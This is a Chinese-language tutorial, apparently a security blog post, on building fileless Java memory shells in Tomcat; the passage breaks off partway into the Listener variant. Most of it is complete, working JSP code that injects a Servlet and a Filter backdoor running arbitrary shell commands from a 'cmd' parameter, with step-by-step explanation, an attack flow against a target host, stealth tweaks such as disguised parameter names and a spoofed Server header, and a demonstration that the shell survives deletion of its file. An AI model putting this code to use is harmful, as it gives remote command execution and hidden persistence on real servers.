根据我的理解，如果把某次请求比作电影中的事件，那么context就相当于事件发生的背景。例如一部电影中的某个镜头中，张三大喊“奥利给”，但是只看这一个镜头我们不知道到底发生了什么，张三是谁，为什么要喊“奥利给”。所以就需要交代当时事情发生的背景。张三是吃饭前喊的奥利给？还是吃饭后喊的奥利给？因为对于同一件事情：张三喊奥利给这件事，发生的背景不同意义可能是不同的。吃饭前喊奥利给可能是饿了的意思，吃饭后喊奥利给可能是说吃饱了的意思。在WEB请求中也如此，在一次request请求发生时，背景，也就是context会记录当时的情形：当前WEB容器中有几个filter，有什么servlet，有什么listener，请求的参数，请求的路径，有没有什么全局的参数等等。
```

#### 2. ServletContext

```markdown
`ServletContext是Servlet规范中规定的ServletContext接口，一般servlet都要实现这个接口。`大概就是规定了如果要实现一个WEB容器，他的Context里面要有这些东西：获取路径，获取参数，获取当前的filter，获取当前的servlet等
```

#### 0.3 ApplicationContext

```markdown
在Tomcat中，ServletContext接口的实现是ApplicationContext，因为门面模式的原因，实际套了一层ApplicationContextFacade。关于什么是门面模式具体可以看[这篇文章](https://www.runoob.com/w3cnote/facade-pattern-3.html)，简单来讲就是加一层包装。

其中`ApplicationContext实现了ServletContext接口定义的一些方法，例如addServlet,addFilter等`
```

#### 0.4 StandardContext

```markdown
StandardContext存在于org.apache.catalina.core.StandardContext。

实际上研究ApplicationContext的代码会发现，`ApplicationContext所实现的方法其实都是调用的this.context中的方法`
```

[![image.png](https://cdn.nlark.com/yuque/0/2021/png/1599908/1615791333561-80d3e967-f36a-4c49-a611-a329bdf1349b.png)](https://cdn.nlark.com/yuque/0/2021/png/1599908/1615791333561-80d3e967-f36a-4c49-a611-a329bdf1349b.png)



[![image.png](https://cdn.nlark.com/yuque/0/2021/png/1599908/1615791389467-3fe1e723-84d1-4e8b-8dfb-8f5712665a6d.png)](https://cdn.nlark.com/yuque/0/2021/png/1599908/1615791389467-3fe1e723-84d1-4e8b-8dfb-8f5712665a6d.png)



[![image.png](https://cdn.nlark.com/yuque/0/2021/png/1599908/1615791403712-f22001f0-8c10-4bb4-9ab9-7bc1fdbe8650.png)](https://cdn.nlark.com/yuque/0/2021/png/1599908/1615791403712-f22001f0-8c10-4bb4-9ab9-7bc1fdbe8650.png)

而这个this.context就是一个实例化的StandardContext对象。

[![image.png](https://cdn.nlark.com/yuque/0/2021/png/1599908/1615791137362-cd302e98-fe22-468f-ae9e-4f2085848df3.png)](https://cdn.nlark.com/yuque/0/2021/png/1599908/1615791137362-cd302e98-fe22-468f-ae9e-4f2085848df3.png)

所以在我看来，StandardContext是Tomcat中真正起作用的Context，负责跟Tomcat的底层交互，ApplicationContext其实更像对StandardContext的一种封装。

用下面这张图来展示一下其中的关系

[![image](https://cdn.nlark.com/yuque/0/2021/png/1599908/1615790929311-f1c15d6e-c317-41c2-9ea7-eadc91a691cf.png)](https://cdn.nlark.com/yuque/0/2021/png/1599908/1615790929311-f1c15d6e-c317-41c2-9ea7-eadc91a691cf.png)



```markdown
★★★回过头看内存马。以添加filter为例，从上面的分析我们可以知道ApplicationContext跟Standerdcontext这两个东西都有addFilter的方法。那么实际选用哪一个呢？其实两种办法都可以。三梦师傅在[基于tomcat的内存 Webshell 无文件攻击技术](https://xz.aliyun.com/t/7388)这篇文章里是利用反射修改了Tomcat的LifecycleState，绕过限制条件调用的ApplicationContext中的addFilter方法。
```

[![image.png](https://cdn.nlark.com/yuque/0/2021/png/1599908/1615795697048-8b5ba421-eb1d-45a9-8084-04127e0484a5.png)](https://cdn.nlark.com/yuque/0/2021/png/1599908/1615795697048-8b5ba421-eb1d-45a9-8084-04127e0484a5.png)

[![image.png](https://cdn.nlark.com/yuque/0/2021/png/1599908/1615796887459-f6e8da3c-9941-418c-a02e-5d217b199aa6.png)](https://cdn.nlark.com/yuque/0/2021/png/1599908/1615796887459-f6e8da3c-9941-418c-a02e-5d217b199aa6.png)

**☆但是因为实际上最终调用的还是StandardContext的addFilter方法，所以我们就可以直接调用StandardContext的addFilter方法进行绕过，从而省去了绕过一堆判断的过程。这种实现具体可以看这个师傅的[公众号文章](https://mp.weixin.qq.com/s/nPAje2-cqdeSzNj4kD2Zgw)。**

## 3.0.Servlet 内存马

### 3.0.1. servlet 内存马demo编写

```markdown
如果我们想要写一个Servlet内存马，需要经过以下步骤：

1. 找到StandardContext
2. 继承并编写一个恶意servlet
3. 创建Wapper对象
4. 设置Servlet的LoadOnStartUp的值
5. 设置Servlet的Name
6. 设置Servlet对应的Class
7. 将Servlet添加到context的children中
8. 将url路径和servlet类做映射
```

写一个简单的demo，注意默认Mac中运行，将servlet.jsp放入Web目录下

```markdown
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="javax.servlet.Servlet" %>
<%@ page import="javax.servlet.ServletConfig" %>
<%@ page import="javax.servlet.ServletContext" %>
<%@ page import="javax.servlet.ServletRequest" %>
<%@ page import="javax.servlet.ServletResponse" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.util.Scanner" %>
<%@ page import="java.io.PrintWriter" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.Wrapper" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<html>
<head>
    <title>MemoryShellInjectDemo</title>
</head>
<body>
<%
    try {
        ServletContext servletContext = request.getSession().getServletContext();
        Field appctx = servletContext.getClass().getDeclaredField("context");
        appctx.setAccessible(true);
        ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
        Field stdctx = applicationContext.getClass().getDeclaredField("context");
        stdctx.setAccessible(true);
        StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
        String servletURL = "/" + getRandomString();
        String servletName = "Servlet" + getRandomString();
        Servlet servlet = new Servlet() {
            @Override
            public void init(ServletConfig servletConfig) {}
            @Override
            public ServletConfig getServletConfig() {
                return null;
            }
            @Override
            public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws IOException {
                String cmd = servletRequest.getParameter("cmd");
                {
                    InputStream in = Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", cmd}).getInputStream();
                    Scanner s = new Scanner(in, "GBK").useDelimiter("\\A");
                    String output = s.hasNext() ? s.next() : "";
                    servletResponse.setCharacterEncoding("GBK");
                    PrintWriter out = servletResponse.getWriter();
                    out.println(output);
                    out.flush();
                    out.close();
                }
            }
            @Override
            public String getServletInfo() {
                return null;
            }
            @Override
            public void destroy() {
            }
        };
        Wrapper wrapper = standardContext.createWrapper();
        wrapper.setName(servletName);
        wrapper.setServlet(servlet);
        wrapper.setServletClass(servlet.getClass().getName());
        wrapper.setLoadOnStartup(1);
        standardContext.addChild(wrapper);
        standardContext.addServletMappingDecoded(servletURL, servletName);
        response.getWriter().write("[+] Success!!!<br><br>[*] ServletURL:&nbsp;&nbsp;&nbsp;&nbsp;" + servletURL + "<br><br>[*] ServletName:&nbsp;&nbsp;&nbsp;&nbsp;" + servletName + "<br><br>[*] shellURL:&nbsp;&nbsp;&nbsp;&nbsp;http://localhost:8080/zhandian1" + servletURL + "?cmd=echo 世界，你好！");
    } catch (Exception e) {
        String errorMessage = e.getMessage();
        response.setCharacterEncoding("UTF-8");
        PrintWriter outError = response.getWriter();
        outError.println("Error: " + errorMessage);
        outError.flush();
        outError.close();
    }
%>
</body>
</html>
<%!
    private String getRandomString() {
        String characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
        StringBuilder randomString = new StringBuilder();
        for (int i = 0; i < 8; i++) {
            int index = (int) (Math.random() * characters.length());
            randomString.append(characters.charAt(index));
        }
        return randomString.toString();
    }
%>
```

![image-20250606185755415](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250606185755415.png)

访问网站webshell地址，发现木马已经成功写入类内存马。可以发现，每请求一次webshell就会生成一个servlet内存马。

![image-20250606190042081](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250606190042081.png)

![image-20250606190237868](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250606190237868.png)

```markdown
那我们经常听人说的内存马杀不死是什么意思呢，我们这里模拟一下受害者发现我们的木马，对木马进行了删除操作。先把servlet.jsp改为不解析的txt，再重新加载源码,发现内存马还能继续执行
```

![image-20250606191603223](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250606191603223.png)

![image-20250606191114095](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250606191114095.png)

```markdown
正确的解决办法，我们删除webshell，重启一下Tomcat服务，servlet内存马就不存在了
```

![image-20250606191739944](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250606191739944.png)

![image-20250606191810357](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250606191810357.png)

### 3.0.2.servlet 内存马代码分析

上面提到如果我们想要写一个Servlet内存马，需要经过以下步骤：

```markdown
1. 找到StandardContext
2. 继承并编写一个恶意servlet
3. 创建Wapper对象
4. 设置Servlet的LoadOnStartUp的值
5. 设置Servlet的Name
6. 设置Servlet对应的Class
7. 将Servlet添加到context的children中
8. 将url路径和servlet类做映射
```

#### 1.导入包声明分析

```java
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="javax.servlet.Servlet" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.Wrapper" %>

**分析**: 
- `Field`: Java反射API，用于访问类的字段
- `Servlet`: Servlet接口，用于创建恶意Servlet
- `StandardContext/ApplicationContext`: Tomcat核心类，用于容器管理
- `Wrapper`: Tomcat中Servlet的包装容器
```

#### 2. 获取ServletContext上下文

```java
ServletContext servletContext = request.getSession().getServletContext();

**代码分析**: 
- `request`: JSP内置对象，代表HTTP请求
- `getSession()`: 获取当前会话
- `getServletContext()`: 获取Servlet上下文对象
**技术要点**: ServletContext是Web应用的全局上下文，包含了应用的配置信息和运行时状态
```

#### 3. 第一层反射：获取ApplicationContext

```java
// 获取ServletContext类中名为"context"的字段
Field appctx = servletContext.getClass().getDeclaredField("context");
// 设置字段可访问（绕过private修饰符）
appctx.setAccessible(true);
// 从servletContext对象中获取该字段的值，并转换为ApplicationContext
ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);

**代码逐行分析**:

1. `getDeclaredField("context")`: 通过反射获取私有字段
2. `setAccessible(true)`: 关键步骤！绕过Java访问控制
3. `appctx.get(servletContext)`: 获取字段实际值
4. 强制类型转换为ApplicationContext

**为什么这样做？**: ServletContext是接口，其实现类内部有private字段指向真正的容器对象
```

#### 4. 第二层反射：获取StandardContext

```java
// 继续从ApplicationContext中获取"context"字段
Field stdctx = applicationContext.getClass().getDeclaredField("context");
stdctx.setAccessible(true);
// 获取StandardContext对象
StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);

**代码分析**:

- 重复相同的反射流程
- StandardContext是最终目标：Tomcat中管理Web应用的核心类
- 它拥有添加、删除Servlet的权限

**对象关系链**: `ServletContext → ApplicationContext → StandardContext`
```

#### 5. 生成随机标识符

```java
String servletURL = "/" + getRandomString();
String servletName = "Servlet" + getRandomString();
```

**辅助函数分析**:

```java
private String getRandomString() {
    String characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    StringBuilder randomString = new StringBuilder();
    for (int i = 0; i < 8; i++) {
        int index = (int) (Math.random() * characters.length());
        randomString.append(characters.charAt(index));
    }
    return randomString.toString();
}
**目的**: 

- 避免与现有Servlet名称冲突
- 增加隐蔽性，难以被管理员发现
- 生成如"/aBcDeFgH"的随机URL
```

#### 6. 创建恶意Servlet（核心攻击载荷）

```java
Servlet servlet = new Servlet() {
    @Override
    public void init(ServletConfig servletConfig) {}
    
    @Override
    public ServletConfig getServletConfig() {
        return null;
    }
    
    // 核心方法：处理HTTP请求
    @Override
    public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws IOException {
        // 从请求参数中获取要执行的命令
        String cmd = servletRequest.getParameter("cmd");
        
        // 执行系统命令的关键代码
        {
            // 使用Runtime.exec执行命令
            InputStream in = Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", cmd}).getInputStream();
            
            // 读取命令执行结果
            Scanner s = new Scanner(in, "GBK").useDelimiter("\\A");
            String output = s.hasNext() ? s.next() : "";
            
            // 设置响应编码
            servletResponse.setCharacterEncoding("GBK");
            
            // 将结果写入HTTP响应
            PrintWriter out = servletResponse.getWriter();
            out.println(output);
            out.flush();
            out.close();
        }
    }
    
    @Override
    public String getServletInfo() {
        return null;
    }
    
    @Override
    public void destroy() {
    }
};
**详细代码分析**:

1. **匿名类实现**: 直接new一个Servlet接口的实现
2. **service方法**: Servlet的核心方法，处理所有HTTP请求
3. **命令注入点**: `String cmd = servletRequest.getParameter("cmd")`
4. **命令执行**: `Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", cmd})`
   - 使用`/bin/bash -c`执行shell命令
   - 支持复杂的shell语法
5. **结果处理**: 
   - `Scanner`读取命令输出
   - `useDelimiter("\\A")`读取整个输入流
   - 通过HTTP响应返回结果
```

#### 7. 创建Wrapper包装器

```java
// 通过StandardContext创建Wrapper对象
Wrapper wrapper = standardContext.createWrapper();

// 设置Servlet的名称
wrapper.setName(servletName);

// 设置Servlet实例
wrapper.setServlet(servlet);

// 设置Servlet类名
wrapper.setServletClass(servlet.getClass().getName());

// 设置启动优先级（1表示立即启动）
wrapper.setLoadOnStartup(1);

**代码分析**:

- `createWrapper()`: 创建Servlet容器包装器
- `setName()`: 设置内部标识名称
- `setServlet()`: 关联我们创建的恶意Servlet
- `setLoadOnStartup(1)`: 确保Servlet立即可用，不需要首次访问才初始化
```

#### 8. 注册到Tomcat容器

```java
// 将Wrapper添加为StandardContext的子组件
standardContext.addChild(wrapper);

// 建立URL到Servlet的映射关系
standardContext.addServletMappingDecoded(servletURL, servletName);

**代码分析**:

1. `addChild(wrapper)`: 
   - 将Wrapper注册到容器中
   - 使Servlet成为Web应用的一部分
2. `addServletMappingDecoded(servletURL, servletName)`:
   - 建立URL路径到Servlet的映射
   - 用户访问该URL时会调用我们的恶意Servlet
```

#### 9. 成功响应输出

```java
response.getWriter().write("[+] Success!!!<br><br>[*] ServletURL:&nbsp;&nbsp;&nbsp;&nbsp;" + servletURL + "<br><br>[*] ServletName:&nbsp;&nbsp;&nbsp;&nbsp;" + servletName + "<br><br>[*] shellURL:&nbsp;&nbsp;&nbsp;&nbsp;http://localhost:8080/zhandian1" + servletURL + "?cmd=echo servlet");

**功能**: 向攻击者返回内存马的访问信息

- Servlet的URL路径
- Servlet的名称  
- 完整的Shell访问URL示例
```



#### 10. 关键技术点深入分析

##### 10.1. 内存马植入阶段（JSP访问时）

```java
// 第1步：获取入口点
ServletContext servletContext = request.getSession().getServletContext();

// 第2步：反射获取内部对象
Field appctx = servletContext.getClass().getDeclaredField("context");
appctx.setAccessible(true);
ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);

// 第3步：获取核心管理对象
Field stdctx = applicationContext.getClass().getDeclaredField("context");
stdctx.setAccessible(true);
StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);

// 第4步：准备恶意组件
String servletURL = "/" + getRandomString();    // 如："/aBcDeFgH"
String servletName = "Servlet" + getRandomString(); // 如："ServletXyZwVuTs"

// 第5步：创建后门Servlet
Servlet servlet = new Servlet() { /* 命令执行逻辑 */ };

// 第6步：包装和注册
Wrapper wrapper = standardContext.createWrapper();
wrapper.setName(servletName);
wrapper.setServlet(servlet);
wrapper.setLoadOnStartup(1);

// 第7步：激活内存马
standardContext.addChild(wrapper);
standardContext.addServletMappingDecoded(servletURL, servletName);
```

##### 10.2. 内存马使用阶段（后续HTTP请求）

```
攻击者访问: http://target.com/webappname/aBcDeFgH?cmd=whoami

↓ Tomcat路由处理

URL匹配: "/aBcDeFgH" → 找到注册的恶意Servlet

↓ Servlet容器调用

service()方法执行:
1. String cmd = request.getParameter("cmd");  // cmd = "whoami"
2. Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", "whoami"});
3. 读取命令执行结果
4. 通过HTTP响应返回结果

↓ 攻击者收到响应

返回命令执行结果: "www-data"
```

##### 10.3. 为什么要用反射？

```java
// 不能直接这样做：
StandardContext ctx = servletContext.getStandardContext(); // 这个方法不存在！

// 必须通过反射：
Field appctx = servletContext.getClass().getDeclaredField("context");
appctx.setAccessible(true); // 绕过private限制

**原因分析**:

- ServletContext只是接口，不暴露内部实现
- Tomcat的内部对象都是private的，正常情况下无法访问
- 反射是Java中访问私有成员的唯一方法
```

##### 10.4. 代码变种和改进

```java
// 原代码的改进点：

// 1. 更隐蔽的参数名
String cmd = servletRequest.getParameter("debug"); // 而不是"cmd"

// 2. 结果编码处理
if (cmd != null && !cmd.isEmpty()) {
    // 添加命令验证逻辑
}

// 3. 错误处理
try {
    Process process = Runtime.getRuntime().exec(cmd);
    // 处理错误流
    InputStream errorStream = process.getErrorStream();
} catch (Exception e) {
    // 静默处理错误
}

// 4. 响应头伪装
servletResponse.setContentType("text/plain");
servletResponse.setHeader("Server", "Apache/2.4.41"); // 伪装服务器
```

### 3.0.4.其他方法

关于StandardContext的获取方法，除了本文中提到的将我们的ServletContext转为StandardContext从而获取context这个方法，还有以下两种方法：

1. 从线程中获取StandardContext，参考Litch1师傅的[文章](https://mp.weixin.qq.com/s/O9Qy0xMen8ufc3ecC33z6A)
2. 从MBean中获取，参考54simo师傅的[文章](https://scriptboy.cn/p/tomcat-filter-inject/)，不过这位师傅的博客已经关闭了，我们可以看[存档](https://web.archive.org/web/20211027223514/https://scriptboy.cn/p/tomcat-filter-inject/)
3. 从spring运行时的上下文中获取，参考 LandGrey@奇安信观星实验室师傅的[文章](https://www.anquanke.com/post/id/198886)

## 3.1.Filter 内存马

### 3.1.0.Filter 内存马demo编写

```markdown
总结下编写Filter型内存马的(即动态创建filter)的步骤:
1. 获取StandardContext
2. 继承并编写一个恶意filter
3. 实例化一个FilterDef类，包装filter并存放到StandardContext.filterDefs中
4. 实例化一个FilterMap类，将我们的 Filter 和 urlpattern 相对应，存放到StandardContext.filterMaps中(一般会放在首位)
5. 通过反射获取filterConfigs，实例化一个FilterConfig(ApplicationFilterConfig)类，传入StandardContext与filterDefs，存放到filterConfig中
```

```markdown
<%@ page import="java.lang.reflect.*" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.util.Map" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
<%@ page import="org.apache.catalina.core.ApplicationFilterConfig" %>
<%@ page import="org.apache.catalina.Context" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="java.io.*" %>
<%@ page import="java.util.Scanner" %>
<%@ page import="java.util.List" %>
<%@ page import="java.util.ArrayList" %>
<%
    ServletContext servletContext = request.getSession().getServletContext();
    Field appctx = servletContext.getClass().getDeclaredField("context");
    appctx.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
    Field stdctx = applicationContext.getClass().getDeclaredField("context");
    stdctx.setAccessible(true);
    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
    Field filterConfigsField = standardContext.getClass().getDeclaredField("filterConfigs");
    filterConfigsField.setAccessible(true);
    Map filterConfigs = (Map) filterConfigsField.get(standardContext);
    String filterName = getRandomString();
    if (filterConfigs.get(filterName) == null) {
        Filter filter = new Filter() {
            @Override
            public void init(FilterConfig filterConfig) {
            }

            @Override
            public void destroy() {
            }

            @Override
            public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
                HttpServletRequest httpServletRequest = (HttpServletRequest) servletRequest;
                String cmd = httpServletRequest.getParameter("cmd");
                {
                    InputStream in = Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", cmd}).getInputStream();
                    Scanner s = new Scanner(in, "GBK").useDelimiter("\\A");
                    String output = s.hasNext() ? s.next() : "";
                    servletResponse.setCharacterEncoding("GBK");
                    PrintWriter out = servletResponse.getWriter();
                    out.println(output);
                    out.flush();
                    out.close();
                }
                filterChain.doFilter(servletRequest, servletResponse);
            }
        };
        FilterDef filterDef = new FilterDef();
        filterDef.setFilterName(filterName);
        filterDef.setFilterClass(filter.getClass().getName());
        filterDef.setFilter(filter);
        standardContext.addFilterDef(filterDef);
        FilterMap filterMap = new FilterMap();
        filterMap.setFilterName(filterName);
        filterMap.addURLPattern("/*");
        filterMap.setDispatcher(DispatcherType.REQUEST.name());
        standardContext.addFilterMapBefore(filterMap);
        Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
        constructor.setAccessible(true);
        ApplicationFilterConfig applicationFilterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);
        filterConfigs.put(filterName, applicationFilterConfig);
        out.print("[+]&nbsp;&nbsp;&nbsp;&nbsp;Malicious filter injection successful!<br>[+]&nbsp;&nbsp;&nbsp;&nbsp;Filter name: " + filterName + "<br>[+]&nbsp;&nbsp;&nbsp;&nbsp;Below is a list displaying filter names and their corresponding URL patterns:");
        out.println("<table border='1'>");
        out.println("<tr><th>Filter Name</th><th>URL Patterns</th></tr>");
        List<String[]> allUrlPatterns = new ArrayList<>();
        for (Object filterConfigObj : filterConfigs.values()) {
            if (filterConfigObj instanceof ApplicationFilterConfig) {
                ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) filterConfigObj;
                String filtername = filterConfig.getFilterName();
                FilterDef filterdef = standardContext.findFilterDef(filtername);
                if (filterdef != null) {
                    FilterMap[] filterMaps = standardContext.findFilterMaps();
                    for (FilterMap filtermap : filterMaps) {
                        if (filtermap.getFilterName().equals(filtername)) {
                            String[] urlPatterns = filtermap.getURLPatterns();
                            allUrlPatterns.add(urlPatterns); // 将当前迭代的urlPatterns添加到列表中

                            out.println("<tr><td>" + filtername + "</td>");
                            out.println("<td>" + String.join(", ", urlPatterns) + "</td></tr>");
                        }
                    }
                }
            }
        }
        out.println("</table>");
        for (String[] urlPatterns : allUrlPatterns) {
            for (String pattern : urlPatterns) {
                if (!pattern.equals("/*")) {
                    out.println("[+]&nbsp;&nbsp;&nbsp;&nbsp;shell: http://localhost:8080/test" + pattern + "?cmd=ipconfig<br>");
                }
            }
        }
    }
%>
<%!
    private String getRandomString() {
        String characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
        StringBuilder randomString = new StringBuilder();
        for (int i = 0; i < 8; i++) {
            int index = (int) (Math.random() * characters.length());
            randomString.append(characters.charAt(index));
        }
        return randomString.toString();
    }
%>
```

启动访问filterdemo.jsp效果如下，但是只能访问一次

![image-20250617120502711](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250617120502711.png)

![image-20250617120612496](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250617120612496.png)

### 3.1.1.Filter内存马代码分析

#### 1. 获取 `StandardContext`

```jsp
ServletContext servletContext = request.getSession().getServletContext();
Field appctx = servletContext.getClass().getDeclaredField("context");
appctx.setAccessible(true);
ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
Field stdctx = applicationContext.getClass().getDeclaredField("context");
stdctx.setAccessible(true);
StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
```

**做了什么？**

- 通过当前请求对象 `request` 获取到 `ServletContext`；
- 利用反射层层深入，最终获取到了 Tomcat 中的核心类 `StandardContext`。
- `StandardContext` 是 Tomcat 的核心组件之一，负责管理 Web 应用的上下文信息，比如 Filter、Servlet 等。

 **简单理解：**

> 就像是拿到了 Web 应用的“控制台”，可以在这里面添加新的过滤器（Filter）、设置路径映射等。

---

#### 2. 继承并编写一个恶意 `Filter`

```java
Filter filter = new Filter() {
    @Override
    public void init(FilterConfig filterConfig) {}

    @Override
    public void destroy() {}

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        HttpServletRequest httpServletRequest = (HttpServletRequest) servletRequest;
        String cmd = httpServletRequest.getParameter("cmd");
        InputStream in = Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", cmd}).getInputStream();
        Scanner s = new Scanner(in, "GBK").useDelimiter("\\A");
        String output = s.hasNext() ? s.next() : "";
        servletResponse.setCharacterEncoding("GBK");
        PrintWriter out = servletResponse.getWriter();
        out.println(output);
        out.flush();
        out.close();
        filterChain.doFilter(servletRequest, servletResponse);
    }
};
```

**做了什么？**

- 定义了一个匿名内部类，继承了 `javax.servlet.Filter`；
- 在 `doFilter()` 方法中实现了远程命令执行的功能：
  - 接收 `cmd` 参数；
  - 使用 `Runtime.exec()` 执行命令；
  - 把结果输出给客户端。

 **简单理解：**

> 这个 Filter 就是你写的一个“后门程序”，只要访问任意页面时带上 `?cmd=xxx`，它就能执行命令并返回结果。

---

####  3. 实例化一个 `FilterDef` 类，并包装你的 Filter

```java
FilterDef filterDef = new FilterDef();
filterDef.setFilterName(filterName);
filterDef.setFilterClass(filter.getClass().getName());
filterDef.setFilter(filter);
standardContext.addFilterDef(filterDef);
```


**做了什么？**

- 创建了一个 `FilterDef` 对象，用来定义 Filter 的元信息；
- 设置了 Filter 的名字、类名和实例；
- 调用 `addFilterDef()` 方法，把这个定义注册进 `StandardContext`。

 **简单理解：**

> 相当于告诉 Tomcat：“我要加一个叫 `filterName` 的过滤器，它是 `XXX类`，具体功能是上面那个 Filter”。

---

####  4. 实例化一个 `FilterMap` 类，绑定 URL 映射

```java
FilterMap filterMap = new FilterMap();
filterMap.setFilterName(filterName);
filterMap.addURLPattern("/*");
filterMap.setDispatcher(DispatcherType.REQUEST.name());
standardContext.addFilterMapBefore(filterMap);
```


**做了什么？**

- 创建了一个 `FilterMap`，用于把 Filter 和 URL 路径做映射；
- 设置了这个 Filter 对应的名字和路径为 `/*`，即所有请求都会经过它；
- 使用 `addFilterMapBefore()` 把这个映射放在最前面，确保优先执行。

 **简单理解：**

> 这一步就是告诉 Tomcat：“这个 Filter 要拦截所有请求，而且要第一个处理”。

---

####  5. 获取 `filterConfigs` 并创建 `ApplicationFilterConfig`

```java
Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
constructor.setAccessible(true);
ApplicationFilterConfig applicationFilterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);
filterConfigs.put(filterName, applicationFilterConfig);
```


**做了什么？**

- 使用反射获取 `ApplicationFilterConfig` 的构造函数；
- 创建了一个真正的 FilterConfig 实例；
- 把这个实例放入 `filterConfigs` 中，完成整个注册流程。

 **简单理解：**

> 最后一步相当于让 Tomcat 正式加载这个 Filter，让它生效。

---

#### X.总结一下Filter类型内存马干了啥？

| 步骤 | 操作                 | 功能                          |
| ---- | -------------------- | ----------------------------- |
| 1️⃣    | 获取 StandardContext | 拿到 Web 应用的“控制权”       |
| 2️⃣    | 编写恶意 Filter      | 实现远程命令执行功能          |
| 3️⃣    | 创建 FilterDef       | 把 Filter 注册成一个定义      |
| 4️⃣    | 创建 FilterMap       | 让 Filter 拦截所有请求        |
| 5️⃣    | 创建 FilterConfig    | 让 Tomcat 正式加载这个 Filter |

**注意事项**

这种注入filter内存马的方法只支持 Tomcat 7.x 以上，因为 javax.servlet.DispatcherType 类是servlet 3 以后引入，而 Tomcat 7以上才支持 Servlet 3

### 3.1.2. Filter通用内存马（支持Tomcat6789）⤴︎待后续扩展

- https://mp.weixin.qq.com/s/sAVh3BLYNHShKwg3b7WZlQ
- [https://www.cnblogs.com/CoLo/p/16840371.html](https://github.com/feihong-cs/memShell/blob/master/src/main/java/com/memshell/tomcat/FilterBasedWithoutRequestVariant.java)
- https://flowerwind.github.io/2021/10/11/tomcat6、7、8、9内存马/
- https://9bie.org/index.php/archives/960/
- https://github.com/xiaopan233/GenerateNoHard
- https://github.com/ax1sX/MemShell/tree/main/TomcatMemShell

```markdown
这里我参考的是https://xz.aliyun.com/t/9914，师傅给出咯Tomcat6789获取StandardContext的方法，但是后续的步骤师傅不想造轮子了，需要根据师傅打的地基后续利用一下，那么我们就要在1. 获取StandardContext后面的2-5步做一个实现，标记一下实现了一下发现失败了

2. 继承并编写一个恶意filter
3. 实例化一个FilterDef类，包装filter并存放到StandardContext.filterDefs中
4. 实例化一个FilterMap类，将我们的 Filter 和 urlpattern 相对应，存放到StandardContext.filterMaps中(一般会放在首位)
5. 通过反射获取filterConfigs，实例化一个FilterConfig(ApplicationFilterConfig)类，传入StandardContext与filterDefs，存放到filterConfig中
```

## 3.2.Listener 内存马

### 3.2.0.Listener 内存马demo编写

```markdown
如果我们想要写一个Listener内存马，需要经过以下步骤：

1.继承并编写一个恶意Listener
2.获取StandardContext，
3.调用StandardContext.addApplicationEventListener()添加恶意Listener
```

我们把前面的知识串起来，因为一个 Context 也会包含多个 Servlet，所以我们在当前Context写入内存马后，可以看到我们可以在站点Context下任意Servlet执行命令。

```markdown
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.util.Scanner" %>

<%!
    public class EvilListener implements ServletRequestListener {
        public void requestDestroyed(ServletRequestEvent sre) {
            HttpServletRequest req = (HttpServletRequest) sre.getServletRequest();
